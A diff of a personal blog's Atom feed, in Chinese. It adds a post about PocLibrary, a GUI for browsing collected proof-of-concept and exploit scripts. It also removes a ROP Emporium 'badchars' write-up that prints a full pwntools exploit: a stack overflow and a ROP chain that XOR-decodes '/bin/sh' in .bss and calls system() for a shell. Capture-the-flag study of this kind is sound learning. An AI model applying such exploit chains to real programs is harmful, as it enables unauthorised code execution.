@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://coldwave96.github.io/"/>
-  <updated>2020-08-20T01:07:25.000Z</updated>
+  <updated>2020-08-24T04:22:23.000Z</updated>
   <id>https://coldwave96.github.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PocLibrary - 界面版POC/EXP仓库</title>
+    <link href="https://coldwave96.github.io/2020/08/24/PocLibrary/"/>
+    <id>https://coldwave96.github.io/2020/08/24/PocLibrary/</id>
+    <published>2020-08-24T04:22:23.000Z</published>
+    <updated>2020-08-24T04:22:23.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="项目起源"><a href="#项目起源" class="headerlink" title="项目起源"></a>项目起源</h2><p>&emsp;&emsp;主要在于自己的强迫症。</p><p>&emsp;&emsp;在做渗透测试或者漏洞验证工作，以及平时玩靶机的时候收集了大量的POC/EXP的脚本，包括在Github上fork了各路大神写的脚本，导致本地文件夹和Github仓库混乱，找起来不是很方便。正好看到了<a href="https://github.com/zhzyker/exphub">@zhzyker的exphub项目</a>，于是借着这个机会把POC/EXP脚本规整一下，做一个界面化的工具出来，就有了<a href="https://github.com/Coldwave96/PocLibrary">PocLibrary</a>项目。</p><a id="more"></a><h2 id="UI搭建"><a href="#UI搭建" class="headerlink" title="UI搭建"></a>UI搭建</h2><p>&emsp;&emsp;很久很久之前用C#做过GUI的开发，长时间没用C#，现在已经忘的差不多了。只能去了解一下Python的GUI开发。</p><p>&emsp;&emsp;Python下的开发GUI的库大体上有PyQt，wxPython和Tkinter。由于这次的界面设计的也比较简单，3种框架差别不大。刚好wxPython有一个类似C# MFC的工具<a href="https://github.com/wxFormBuilder/wxFormBuilder">wxFormBuilder</a>，于是最终选择了wxPython框架开发GUI界面。</p><p>&emsp;&emsp;首先设计一个选择POC/EXP模块的主界面：</p><p><img src="/img/PocLibrary/PocLibrary1.png" alt=""></p><p>&emsp;&emsp;然后再设计一个显示某个POC/EXP脚本信息的子界面：</p><p><img src="/img/PocLibrary/PocLibrary2.png" alt=""></p><p>&emsp;&emsp;考虑到错误处理，于是再创建一个错误信息告警界面：</p><p><img src="/img/PocLibrary/PocLibrary3.png" alt=""></p><p>&emsp;&emsp;这时wxFormBuilder会帮我们自动生成好界面的代码：</p><p><img src="/img/PocLibrary/PocLibrary4.png" alt=""></p><p>&emsp;&emsp;可以看到有很多种语言的版本，我们选择Python版的。</p><h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><p>&emsp;&emsp;界面搭好之后就是按照界面上的预想功能去实现。在主界面上有一个下拉的List，可以选择POC/EXP模块。</p><p><img src="/img/PocLibrary/PocLibrary5.png" alt=""></p><p>&emsp;&emsp;图中展示了1.0版本中的模块，目前总共有14个模块，具体参见<a href="https://github.com/Coldwave96/PocLibrary">项目主页</a>。</p><p>&emsp;&emsp;选好模块之后，点击确定Button会触发Bind的事件，根据提交的模块的值去定制显示信息的子界面。在子界面中继续选择想要查看的POC/EXP脚本，点击确定Button显示POC/EXP信息、POC/EXP脚本的用法以及对应的漏洞信息。</p><p><img src="/img/PocLibrary/PocLibrary6.png" alt=""></p><p>&emsp;&emsp;并提供了Copy功能复制POC/EXP脚本内容，但是目前有些脚本因为Bug无法复制，只能手动复制。</p><p>&emsp;&emsp;没有做自动执行的功能，主要是考虑到POC/EXP都是从各个地方收集而来，执行的命令包括执行时需要的环境都不一样，很难做到统一，所以目前就仅仅实现了简单的Copy供用户复制出来自行配环境运行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;更多信息见项目主页。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;项目起源&quot;&gt;&lt;a href=&quot;#项目起源&quot; class=&quot;headerlink&quot; title=&quot;项目起源&quot;&gt;&lt;/a&gt;项目起源&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;主要在于自己的强迫症。&lt;/p&gt;
+&lt;p&gt;&amp;emsp;&amp;emsp;在做渗透测试或者漏洞验证工作，以及平时玩靶机的时候收集了大量的POC/EXP的脚本，包括在Github上fork了各路大神写的脚本，导致本地文件夹和Github仓库混乱，找起来不是很方便。正好看到了&lt;a href=&quot;https://github.com/zhzyker/exphub&quot;&gt;@zhzyker的exphub项目&lt;/a&gt;，于是借着这个机会把POC/EXP脚本规整一下，做一个界面化的工具出来，就有了&lt;a href=&quot;https://github.com/Coldwave96/PocLibrary&quot;&gt;PocLibrary&lt;/a&gt;项目。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Tools" scheme="https://coldwave96.github.io/categories/Tools/"/>
+    
+      <category term="Program" scheme="https://coldwave96.github.io/categories/Tools/Program/"/>
+    
+      <category term="Python" scheme="https://coldwave96.github.io/categories/Tools/Program/Python/"/>
+    
+    
+      <category term="Github" scheme="https://coldwave96.github.io/tags/Github/"/>
+    
+  </entry>
   
   <entry>
     <title>HackINonE - 工具轮子</title>
@@ -539,35 +567,6 @@
       <category term="Web" scheme="https://coldwave96.github.io/tags/Web/"/>
     
       <category term="DC Series" scheme="https://coldwave96.github.io/tags/DC-Series/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ROP Emporium の badchars</title>
-    <link href="https://coldwave96.github.io/2020/06/05/badchars/"/>
-    <id>https://coldwave96.github.io/2020/06/05/badchars/</id>
-    <published>2020-06-05T01:32:06.000Z</published>
-    <updated>2020-06-05T01:32:06.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&emsp;&emsp;<a href="https://ropemporium.com">ROP Emporium</a>训练4：badchars的解析。</p><a id="more"></a><h2 id="badchars32"><a href="#badchars32" class="headerlink" title="badchars32"></a>badchars32</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>&emsp;&emsp;程序正常运行截图：</p><p><img src="/img/badchars/badchars1.png" alt=""></p><p>&emsp;&emsp;可以看到运行时提示badchars，结合题目说明，可能这些字符串会被程序特殊处理。</p><p>&emsp;&emsp;checksec：32位程序，依然只开启了DEP保护</p><p><img src="/img/badchars/badchars2.png" alt=""></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>&emsp;&emsp;将程序丢到IDA Pro中去（至于为什么没用hopper，只能说这题需要理解下程序，而hopper的伪代码不够C……），先看下main函数：</p><p><img src="/img/badchars/badchars3.png" alt=""></p><p>&emsp;&emsp;main函数聚焦在pwnme函数:</p><p><img src="/img/badchars/badchars4.png" alt=""></p><p>&emsp;&emsp;首先发现memcpy函数存在栈溢出漏洞，其次出现了两个函数nstrlen和checkBadchars：</p><p><img src="/img/badchars/badchars5.png" alt=""></p><p>&emsp;&emsp;nstrlen函数是当遇到0xa（ASII码10即’\n’）时就截断。</p><p><img src="/img/badchars/badchars6.png" alt=""></p><p>&emsp;&emsp;checkBadchars函数是遇到\x62（ASII码98即’b’）、\x69（ASII码105即’i’）、\x63（ASII码99即’c’）、\x2f（ASII码47即’/‘）、\x20（ASII码32即’<space>‘）、\x66（ASII码102即’f’）、\x6e（ASII码110即’n’）、\x73（ASII码115即’s’）时将其替换成’-21’。</p><p>&emsp;&emsp;还发现程序中是存在system函数的，但是没有’/bin/sh’字符串。所以我们需要将需要的字符串写入内存，这样就会遇到’/’、’b’、’s’被过滤的情况。</p><p>&emsp;&emsp;为了解决这个情况，根据题目的提示，需要通过XOR（异或）对输入的字符串加密后输入然后再解密。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>&emsp;&emsp;顺着这个思路首先解决第一个问题，字符串写到哪里。看一下各个段的权限，下面的段是有写权限的：</p><p><img src="/img/badchars/badchars7.png" alt=""></p><p>&emsp;&emsp;.bss段是空的所以可以把字符串写在.bss段。</p><p>&emsp;&emsp;然后是第二个问题怎么实现异或，通过ROPgadget找一下：</p><p><img src="/img/badchars/badchars8.png" alt=""></p><p>&emsp;&emsp;果然在0x08048890这里存在这样一条XOR指令可以利用。通过这条指令我们可以将XOR后的’/bin/sh’字符串传入，通过这条指令解密后再作为system函数的参数。</p><p>&emsp;&emsp;接着是XOR值的选择，我们可以写个简单的脚本找一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">badchars = <span class="string">&#x27;\x62\x69\x63\x2f\x20\x66\x6e\x73&#x27;</span></span><br><span class="line"></span><br><span class="line">sh_string = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">sh_str</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(sh_str)):</span><br><span class="line">        tmp = chr(ord(sh_str[j]) ^ i)</span><br><span class="line">        <span class="keyword">if</span> tmp <span class="keyword">in</span> badchars:</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line">xor(sh_string)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;运行结果为2，即当’/bin/sh\x00’和2异或的时候不会出现被过滤的字符。</p><p>&emsp;&emsp;当然还需要找一个指令段帮助控制ebx和cl寄存器（32位的ecx寄存器分为两个16位的cx寄存器，cx寄存器再分成8位的ch和cl寄存器）的值，也通过ROPgadget找一下：</p><p><img src="/img/badchars/badchars9.png" alt=""></p><p>&emsp;&emsp;最后就是找两个指令段，分别辅助写入和控制寄存器：</p><p><img src="/img/badchars/badchars10.png" alt=""></p><p>&emsp;&emsp;图中标记的一对指令刚好满足条件。</p><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>&emsp;&emsp;思路顺利之后就是写EXP了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./badchars32&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./badchars32&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* sys_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">* bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">* </span><br><span class="line">* xor_addr = <span class="number">0x08048890</span></span><br><span class="line">* <span class="comment">#pop_ebx_addr = 0x08048461</span></span><br><span class="line">* <span class="comment">#pop_ecx_addr = 0x08048897</span></span><br><span class="line">* pop_ebx_ecx_addr = <span class="number">0x08048896</span></span><br><span class="line">* </span><br><span class="line">* mov_addr = <span class="number">0x08048893</span></span><br><span class="line">* pop_addr = <span class="number">0x08048899</span></span><br><span class="line">* </span><br><span class="line">* shell = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">* xor_shell = <span class="string">&#x27;&#x27;</span></span><br><span class="line">* <span class="keyword">for</span> i <span class="keyword">in</span> shell:</span><br><span class="line">* xor_shell += chr(ord(i) ^ <span class="number">2</span>)</span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">0x4</span>)</span><br><span class="line">* payload += p32(pop_addr) + xor_shell[<span class="number">0</span>:<span class="number">4</span>] + p32(bss_addr) + p32(mov_addr)</span><br><span class="line">* payload += p32(pop_addr) + xor_shell[<span class="number">4</span>:<span class="number">8</span>] + p32(bss_addr + <span class="number">4</span>) + p32(mov_addr)</span><br><span class="line">* </span><br><span class="line">* <span class="keyword">for</span> j <span class="keyword">in</span> range(len(xor_shell)):</span><br><span class="line">* <span class="comment">#payload += p32(pop_ebx_addr)</span></span><br><span class="line">* <span class="comment">#payload += p32(bss_addr + j)</span></span><br><span class="line">* <span class="comment">#payload += p32(pop_ecx_addr)</span></span><br><span class="line">* payload += p32(pop_ebx_ecx_addr)</span><br><span class="line">* payload += p32(bss_addr + j)</span><br><span class="line">* payload += p32(<span class="number">2</span>)</span><br><span class="line">* payload += p32(xor_addr)</span><br><span class="line">* </span><br><span class="line">* payload += p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;注释掉的部分是在传入的XOR加密shellcode解密时候，将xor指令的传参分成两步进行，可是却无法正确getshell，希望有大佬可以解惑。</p><p>&emsp;&emsp;EXP运行结果：</p><p><img src="/img/badchars/badchars11.png" alt=""></p><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><p>&emsp;&emsp;64位程序和32位思路一样，传参的时候甚至更加简单，因为可以一次性将需要的字符串写入内存。</p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>&emsp;&emsp;写入的字符串可以是’sh\x00\x00’，这样32位程序也可以实现一次性传参，前提是sh系统变量就是默认的’/bin/sh’命令。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;&lt;a href=&quot;https://ropemporium.com&quot;&gt;ROP Emporium&lt;/a&gt;训练4：badchars的解析。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
-    
-      <category term="ROP Emporium" scheme="https://coldwave96.github.io/categories/WriteUPs/ROP-Emporium/"/>
-    
-    
-      <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
-    
-      <category term="Stack" scheme="https://coldwave96.github.io/tags/Stack/"/>
-    
-      <category term="ROP" scheme="https://coldwave96.github.io/tags/ROP/"/>
     
   </entry>
   
